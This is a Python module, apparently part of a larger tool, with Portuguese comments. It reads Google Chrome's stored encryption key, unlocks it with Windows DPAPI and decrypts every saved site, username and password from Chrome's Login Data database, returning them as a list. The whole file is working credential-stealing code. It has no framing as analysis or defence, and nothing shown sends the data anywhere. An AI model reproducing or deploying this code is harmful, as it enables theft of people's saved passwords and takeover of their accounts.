# modules/credentials.py
import os
import json
import base64
import win32crypt
from Crypto.Cipher import AES
import sqlite3

def get_encryption_key():
    """Obtém a chave de criptografia do Chrome."""
    local_state_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    return win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]

def decrypt_password(encrypted_password, key):
    """Descriptografa uma senha salva no Chrome."""
    iv = encrypted_password[3:15]
    encrypted_password = encrypted_password[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    return cipher.decrypt(encrypted_password)[:-16].decode()

def get_credentials():
    """Obtém credenciais salvas no Chrome."""
    credentials_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
    if not os.path.exists(credentials_path):
        return []
    
    key = get_encryption_key()
    conn = sqlite3.connect(credentials_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    credentials = []
    
    for url, username, encrypted_password in cursor.fetchall():
        decrypted_password = decrypt_password(encrypted_password, key)
        credentials.append({"url": url, "username": username, "password": decrypted_password})
    
    conn.close()
    return credentials
